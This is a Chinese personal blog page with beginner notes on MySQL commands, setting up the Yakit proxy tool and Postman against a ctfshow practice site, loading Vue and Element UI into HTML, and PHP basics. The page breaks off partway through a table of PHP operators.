-
-<p>表删除列</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">alter table table_name drop 列名;</span><br><span class="line"></span><br><span class="line">alter table student drop height</span><br></pre></td></tr></table></figure>
-
-<p>列改名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">alter table 表名 change column 被改列名 要改成的名字 类型;</span><br><span class="line"></span><br><span class="line">alter table student change column height high int(3);</span><br></pre></td></tr></table></figure>
-
-<p>列更改数据类型</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">alter table 表名 modify column 要改的列名 数据类型</span><br><span class="line"></span><br><span class="line">alter table student modify column high char(10);</span><br></pre></td></tr></table></figure>
-
-<p>修改表名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">alter table 前表名 rename to 要改成的表名;</span><br><span class="line"></span><br><span class="line">alter table student rename to student_table1;</span><br><span class="line">show tables;</span><br></pre></td></tr></table></figure>
-
-<h3 id="MySQL数据操作"><a href="#MySQL数据操作" class="headerlink" title="MySQL数据操作"></a>MySQL数据操作</h3><p>增加&#x2F;插入数据</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">insert into u&#x27;s表名 (列名1,列名,列名1,...) value (数据,数据,数据,数据,...);</span><br><span class="line"></span><br><span class="line">insert into student_table(id,name,age,sex,high) value (001,&quot;张三&quot;,10,&quot;男&quot;,160);</span><br><span class="line">insert into student_table(id,name,age,sex,high) value (002,&quot;丽丽&quot;,12,&quot;女&quot;,140);</span><br><span class="line">select * from student_table;</span><br></pre></td></tr></table></figure>
-
-<p>删除数据项</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">delete from 表名 where 列名=条件;</span><br><span class="line"></span><br><span class="line">delete from student_table where high=140;</span><br></pre></td></tr></table></figure>
-
-<p>更新数据项</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">update 表名 set 列名=数据 where 条件;</span><br><span class="line"></span><br><span class="line">update student_table  set age=12;</span><br><span class="line">update student_table set age=12 where name=&#x27;张三&#x27;;</span><br><span class="line">select * from student_table;</span><br></pre></td></tr></table></figure>
-
-<ol>
-<li><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><p>between</p>
-<p> 最小值 and 最大值</p>
-</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">create table stu(id int,name char(10),age int,sex char(5),high int(3));</span><br><span class="line">insert into stu(id,name,age,sex,high) value (001,&quot;张三&quot;,10,&quot;男&quot;,160);</span><br><span class="line">insert into stu(id,name,age,sex,high) value (002,&quot;丽丽&quot;,12,&quot;女&quot;,140);</span><br><span class="line">insert into stu(id,name,age,sex,high) value (003,&quot;王五&quot;,11,&quot;男&quot;,140);</span><br><span class="line">insert into stu(id,name,age,sex,high) value (004,&quot;李四&quot;,12,&quot;男&quot;,140);</span><br><span class="line">insert into stu(id,name,age,sex,high) value (005,&quot;王伟&quot;,11,&quot;男&quot;,140);</span><br><span class="line">insert into stu(id,name,age,sex,high) value (006,&quot;华子&quot;,12,&quot;男&quot;,140);</span><br><span class="line"></span><br><span class="line">select * from 表名 where 列名 between 最小值 and 最大值；</span><br><span class="line"></span><br><span class="line">select * from stu where id between 2 and 4;</span><br><span class="line">select * from stu where id&gt;=2 and id&lt;=4;</span><br></pre></td></tr></table></figure>
-
-<p>空值 null</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">select * from 表名 where 列名 is null；（判断这一列有空值）</span><br><span class="line"></span><br><span class="line">select * from stu where high is null;</span><br></pre></td></tr></table></figure>
-
-<p>in(额外取值)</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">语法：select * from 表名 where 列名 in （值1，值2，…）</span><br><span class="line"></span><br><span class="line">select * from stu where age in(10,11,9);</span><br><span class="line">select * from stu where age in(10,11);</span><br></pre></td></tr></table></figure>
-
-<p>like 好像</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">% 代表任意字符 ,_一个下划线代替一个字符</span><br><span class="line">select * from 表名 where 列名 like ‘通配符 特征 通配符’；</span><br><span class="line"></span><br><span class="line">select * from student where name like &#x27;王_&#x27;;</span><br><span class="line">insert into stu(id,name,age,sex,high) value (009,&quot;王八蛋&quot;,11,&quot;男&quot;,140);</span><br><span class="line">select * from student where name like &#x27;王%&#x27;;</span><br></pre></td></tr></table></figure>
-
-<p>as 为表名称或者列名称指定别名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">select name as mz from stu where name like &#x27;王_&#x27;;</span><br></pre></td></tr></table></figure>
-
-<p>union合并两个或多个select语句结果集</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">select * from stu;</span><br><span class="line">select id from stu as st where st.name like &#x27;张_&#x27; union select name from stu where age=9;</span><br><span class="line"></span><br><span class="line">select id from stu as st where st.name like &#x27;张_&#x27; union select name from stu where high=140;</span><br></pre></td></tr></table></figure>
-
-<h3 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h3><p>order by</p>
-<p>规则：升序排序 asc （默认可省略） 降序排序 desc</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">单列 select * from 表名 order by 列名 asc或者 desc；</span><br><span class="line">多列 select * from 表名 order by 列名 asc或者 desc，列名2 asc或者desc，…;</span><br><span class="line"></span><br><span class="line">select * from stu order by age;</span><br><span class="line">select * from stu order by age desc;</span><br><span class="line">select * from stu order by age asc,id desc;</span><br></pre></td></tr></table></figure>
-
-<h3 id="去重"><a href="#去重" class="headerlink" title="去重"></a>去重</h3><p>GROUP BY 和 DISTINCT 都是用于从数据库中选择唯一值的 SQL 子句</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">select distinct age from stu;</span><br><span class="line"></span><br><span class="line">select age,count(*) from stu group by age;</span><br><span class="line">select age from stu group by age;</span><br></pre></td></tr></table></figure>
-
-<p>GROUP BY 语句用于将数据按照一个或多个列进行分组，然后对每个组应用一个聚合函数以得到每个组的统计结果。GROUP BY 通常用于在查询中生成汇总信息。</p>
-<p>DISTINCT 语句用于从查询结果中选择唯一的值。它可以用于从一个或多个列中选择唯一的值，也可以用于选择整行的唯一值。</p>
-<h3 id="统计函数"><a href="#统计函数" class="headerlink" title="统计函数"></a>统计函数</h3><p>语法：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">select 统计函数（列名），统计函数（列名2）... from 表名;</span><br></pre></td></tr></table></figure>
-
-<p>count：计算指定列或表达式的行数，可以用于统计记录数量。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">SELECT COUNT(*) FROM table_name; 将返回表中的记录数。</span><br><span class="line"></span><br><span class="line">select id,count(*) from stu group by id;</span><br></pre></td></tr></table></figure>
-
-<p>sum：计算指定列或表达式的总和。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">SELECT SUM(salary) FROM employees; 将返回 employees 表中 salary 列的总和。</span><br><span class="line"></span><br><span class="line">select sum(high) from stu;</span><br></pre></td></tr></table></figure>
-
-<p>avg：计算指定列或表达式的平均值。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">SELECT AVG(age) FROM students; 将返回 students 表中 age 列的平均值。</span><br><span class="line"></span><br><span class="line">select avg(high) from stu;</span><br></pre></td></tr></table></figure>
-
-<p>max：返回指定列或表达式的最大值。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">SELECT MAX(price) FROM products; 将返回 products 表中 price 列的最大值。</span><br><span class="line"></span><br><span class="line">select max(id) from stu;</span><br></pre></td></tr></table></figure>
-
-<p>MIN：返回指定列或表达式的最小值。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">SELECT MIN(quantity) FROM inventory; 将返回 inventory 表中 quantity 列的最小值。</span><br><span class="line"></span><br><span class="line">select min(id) from stu;</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/12/24/MySQL%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/" data-id="clr4slxw60002qofn8kgkbb5n" data-title="MySQL的基本操作" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-yakit与pstman使用安装" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/12/24/yakit%E4%B8%8Epstman%E4%BD%BF%E7%94%A8%E5%AE%89%E8%A3%85/" class="article-date">
-  <time class="dt-published" datetime="2023-12-24T01:33:32.000Z" itemprop="datePublished">2023-12-24</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/12/24/yakit%E4%B8%8Epstman%E4%BD%BF%E7%94%A8%E5%AE%89%E8%A3%85/">yakit与pstman使用安装</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h2 id="yakit与pstman使用安装"><a href="#yakit与pstman使用安装" class="headerlink" title="yakit与pstman使用安装"></a>yakit与pstman使用安装</h2><p>先安装谷歌浏览器</p>
-<h4 id="到yakit官网下载安装包"><a href="#到yakit官网下载安装包" class="headerlink" title="到yakit官网下载安装包"></a>到yakit官网下载安装包</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.yaklang.io/products/intro/</span><br></pre></td></tr></table></figure>
-
-<p>点击左上角yak头像   下载windows版本</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312240937526.png" alt="image-20231224093735934"></p>
-<p>安装后初始化引擎</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312240948529.png" alt="image-20231220110130508"></p>
-<p>项目管理中选择default</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312240949913.png" alt="image-20231220110520065"></p>
-<p>点击mitm</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312240950375.png" alt="image-20231220110753695"></p>
-<h4 id="免配置启动"><a href="#免配置启动" class="headerlink" title="免配置启动"></a>免配置启动</h4><p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312240950513.png" alt="image-20231220110845970"></p>
-<p>启动免配置chrome</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312240951346.png" alt="image-20231220110913655"></p>
-<p>请输入目标地址</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312240951258.png" alt="image-20231220112147436"></p>
-<h3 id="postman的使用"><a href="#postman的使用" class="headerlink" title="postman的使用"></a>postman的使用</h3><h4 id="新建项目"><a href="#新建项目" class="headerlink" title="新建项目"></a>新建项目</h4><p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312240952980.png" alt="image-20231222195401845"></p>
-<h4 id="get请求的链接"><a href="#get请求的链接" class="headerlink" title="get请求的链接"></a>get请求的链接</h4><p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312240953192.png" alt="image-20231222195439867"></p>
-<h4 id="链接的获取"><a href="#链接的获取" class="headerlink" title="链接的获取"></a>链接的获取</h4><p>这里使用ctfshow-web靶场进行使用</p>
-<p>用火狐浏览器打开</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312240953709.png" alt="image-20231222200240012"></p>
-<p>火狐浏览器f12打开开发者工具</p>
-<p>选择网络，然后重新加载网页</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312240953771.png" alt="image-20231222200751333"></p>
-<p>会出现很多get请求</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312240954310.png" alt="image-20231222200900986"></p>
-<p>根据文件响应可以判断api文件请求</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312240954579.png" alt="image-20231222201018378"></p>
-<p>复制消息头的get链接放到postman中</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312240954921.png" alt="image-20231222201046430"></p>
-<p>send发送后可以看到有数据接受</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312240955657.png" alt="image-20231222201404518"></p>
-<p>加入键名id&#x3D;1可以看到</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312240955812.png" alt="image-20231222201558700"></p>
-<p>之后就可以进行相关操作了</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312240956766.png" alt="image-20231222201829702"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/12/24/yakit%E4%B8%8Epstman%E4%BD%BF%E7%94%A8%E5%AE%89%E8%A3%85/" data-id="clr4slxwe000hqofn0a870j4r" data-title="yakit与pstman使用安装" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-html导入vue" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/12/17/html%E5%AF%BC%E5%85%A5vue/" class="article-date">
-  <time class="dt-published" datetime="2023-12-17T12:44:17.000Z" itemprop="datePublished">2023-12-17</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/12/17/html%E5%AF%BC%E5%85%A5vue/">html导入vue</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="html导入vue"><a href="#html导入vue" class="headerlink" title="html导入vue"></a>html导入vue</h1><p>引入样式与引入组件库</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!-- 引入样式 --&gt;</span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;https://unpkg.com/element-ui/lib/theme-chalk/index.css&quot;&gt;</span><br><span class="line">&lt;!-- 引入组件库 --&gt;</span><br><span class="line">&lt;script src=&quot;https://unpkg.com/element-ui/lib/index.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;https://unpkg.com/vue@2/dist/vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>可以链接访问后复制黏贴到文件目录</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312172045282.png" alt="image-20231217093604655"></p>
-<p>文件名要一样</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312172045261.png" alt="image-20231217095145083"></p>
-<p>在php文件中调用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;./index.css&quot;&gt;</span><br><span class="line">    &lt;script src=&quot;./vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=&quot;./index.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=&quot;./axios.min.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312172048348.png" alt="image-20231217204821206"></p>
-<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312172048602.png" alt="image-20231217095622735"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">  &lt;!-- import CSS --&gt;</span><br><span class="line">  &lt;link rel=&quot;./index.css&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;el-button @click=&quot;visible = true&quot;&gt;Button&lt;/el-button&gt;</span><br><span class="line">    &lt;el-dialog :visible.sync=&quot;visible&quot; title=&quot;Hello world&quot;&gt;</span><br><span class="line">      &lt;p&gt;Try Element&lt;/p&gt;</span><br><span class="line">    &lt;/el-dialog&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">  &lt;!-- import Vue before Element --&gt;</span><br><span class="line">  &lt;script src=&quot;./vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">  &lt;!-- import JavaScript --&gt;</span><br><span class="line">  &lt;script src=&quot;./index.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    new Vue(&#123;</span><br><span class="line">      el: &#x27;#app&#x27;,</span><br><span class="line">      data: function() &#123;</span><br><span class="line">        return &#123; visible: false &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>网页会出现一个button按钮</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312172049158.png" alt="image-20231217095955639"></p>
-<p>点击会出现弹窗</p>
-<p><img src="https://raw.githubusercontent.com/lzqnbnb/lsp/main/img/202312172049042.png" alt="image-20231217100125189"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/12/17/html%E5%AF%BC%E5%85%A5vue/" data-id="clr4slxwa0009qofnhgxe7ib7" data-title="html导入vue" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-php学习" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/12/17/php%E5%AD%A6%E4%B9%A0/" class="article-date">
-  <time class="dt-published" datetime="2023-12-17T12:42:52.000Z" itemprop="datePublished">2023-12-17</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/12/17/php%E5%AD%A6%E4%B9%A0/">php学习</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="php学习"><a href="#php学习" class="headerlink" title="php学习"></a>php学习</h1><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><p>PHP 是一种创建动态交互性站点的强有力的服务器端脚本语言</p>
-<p>PHP 脚本以  结束：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">// PHP 代码</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>PHP 文件的默认文件扩展名是 <strong>.php</strong></p>
-<p>PHP 中的每个代码行都必须以分号结束。分号是一种分隔符，用于把指令集区分开来。</p>
-<p>通过 PHP，有两种在浏览器输出文本的基础指令：<strong>echo</strong> 和 <strong>print</strong>。</p>
-<h3 id="PHP-变量"><a href="#PHP-变量" class="headerlink" title="PHP 变量"></a>PHP 变量</h3><p>与代数类似，可以给 PHP 变量赋予某个值（x&#x3D;5）或者表达式（z&#x3D;x+y）。</p>
-<p>变量可以是很短的名称（如 x 和 y）或者更具描述性的名称（如 age、carname、totalvolume）。</p>
-<p>PHP 变量规则：</p>
-<ul>
-<li>变量以 $ 符号开始，后面跟着变量的名称</li>
-<li>变量名必须以字母或者下划线字符开始</li>
-<li>变量名只能包含字母、数字以及下划线（A-z、0-9 和 _ ）</li>
-<li>变量名不能包含空格</li>
-<li>变量名是区分大小写的（$y 和 $Y 是两个不同的变量）</li>
-</ul>
-<h3 id="echo-和-print"><a href="#echo-和-print" class="headerlink" title="echo 和 print"></a>echo 和 print</h3><ul>
-<li>echo - 可以输出一个或多个字符串</li>
-<li>print - 只允许输出一个字符串，返回值总为 1</li>
-<li>echo 输出的速度比 print 快， echo 没有返回值，print有返回值1</li>
-<li>echo print是语言结构，使用的时候可以不用加括号，也可以加上括号： echo 或 echo()</li>
-</ul>
-<h3 id="类型比较"><a href="#类型比较" class="headerlink" title="类型比较"></a>类型比较</h3><p>PHP 是弱类型语言，对 PHP 变量进行比较，包含松散和严格比较</p>
-<ul>
-<li>松散比较：使用两个等号 <strong>&#x3D;&#x3D;</strong> 比较，只比较值，不比较类型。</li>
-<li>严格比较：用三个等号 <strong>&#x3D;&#x3D;&#x3D;</strong> 比较，除了比较值，也比较类型。</li>
-</ul>
-<h3 id="PHP-常量"><a href="#PHP-常量" class="headerlink" title="PHP 常量"></a>PHP 常量</h3><p>常量是一个简单值的标识符。该值在脚本中不能改变。</p>
-<p>一个常量由英文字母、下划线、和数字组成,但数字不能作为首字母出现。 </p>
-<p>常量名不需要加 $ 修饰符。</p>
-<p>常量在整个脚本中都可以使用。</p>
-<h3 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h3><table>
-<thead>
-<tr>
-<th>运算符</th>
-<th>名称</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>x + y</td>
-<td>加</td>
-<td>x 和 y 的和</td>
-</tr>
-<tr>
-<td>x - y</td>
-<td>减</td>
-<td>x 和 y 的差</td>
-</tr>
-<tr>
-<td>x * y</td>
-<td>乘</td>
-<td>x 和 y 的积</td>
-</tr>
-<tr>
-<td>x &#x2F; y</td>
-<td>除</td>
-<td>x 和 y 的商</td>
-</tr>
-<tr>
-<td>x % y</td>
-<td>模（除法的余数）</td>
-<td>x 除以 y 的余数</td>
-</tr>
-<tr>
-<td>-x</td>
-<td>设置负数</td>
-<td>取 x 的相反符号</td>
-</tr>
-<tr>
-<td>~x</td>
-<td>取反</td>
-<td>x 取反，按二进制位进行”取反”运算。运算规则：<code>~1=-2;    ~0=-1;</code></td>
-</tr>
-<tr>
-<td>a . b</td>
-<td>并置</td>
-<td>连接两个字符串</td>
-</tr>
-</tbody></table>
-<h3 id="递增-递减运算符"><a href="#递增-递减运算符" class="headerlink" title="递增&#x2F;递减运算符"></a>递增&#x2F;递减运算符</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">++ x	预递增	x 加 1，然后返回 x</span><br><span class="line">x ++	后递增	返回 x，然后 x 加 1</span><br><span class="line">-- x	预递减	x 减 1，然后返回 x</span><br><span class="line">x --	后递减	返回 x，然后 x 减 1</span><br></pre></td></tr></table></figure>
-
-<h3 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h3><table>
-<thead>
-<tr>
-<th>运算符</th>
-<th>名称</th>
-<th>描述</th>
-<th>实例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>x &#x3D;&#x3D; y</td>
-<td>等于</td>
-<td>如果 x 等于 y，则返回 true</td>
-<td>5&#x3D;&#x3D;8 返回 false</td>
-</tr>
-<tr>
-<td>x &#x3D;&#x3D;&#x3D; y</td>
-<td>绝对等于</td>
-<td>如果 x 等于 y，且它们类型相同，则返回 true</td>
-<td>5&#x3D;&#x3D;&#x3D;”5” 返回 false</td>
-</tr>
-<tr>
-<td>x !&#x3D; y</td>
-<td>不等于</td>
-<td>如果 x 不等于 y，则返回 true</td>
-<td>5!&#x3D;8 返回 true</td>
-</tr>
-<tr>
-<td>x &lt;&gt; y</td>
-<td>不等于</td>
-<td>如果 x 不等于 y，则返回 true</td>
-<td>5&lt;&gt;8 返回 true</td>
-</tr>
-<tr>
-<td>x !&#x3D;&#x3D; y</td>
-<td>不绝对等于</td>
-<td>如果 x 不等于 y，或它们类型不相同，则返回 true</td>
-<td>5!&#x3D;&#x3D;”5” 返回 true</td>
-</tr>
-<tr>
-<td>x &gt; y</td>
-<td>大于</td>
-<td>如果 x 大于 y，则返回 true</td>
-<td>5&gt;8 返回 false</td>
-</tr>
-<tr>
-<td>x &lt; y</td>
-<td>小于</td>
-<td>如果 x 小于 y，则返回 true</td>
-<td>5&lt;8 返回 true</td>
-</tr>
-<tr>
-<td>x &gt;&#x3D; y</td>
-<td>大于等于</td>
-<td>如果 x 大于或者等于 y，则返回 true</td>
-<td>5&gt;&#x3D;8 返回 false</td>
-</tr>
-<tr>
-<td>x &lt;&#x3D; y</td>
-<td>小于等于</td>
-<td>如果 x 小于或者等于 y，则返回 true</td>
-<td>5&lt;&#x3D;8 返回 true</td>
-</tr>
-</tbody></table>
-<h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><table>
-<thead>
-<tr>
-<th>运算符</th>
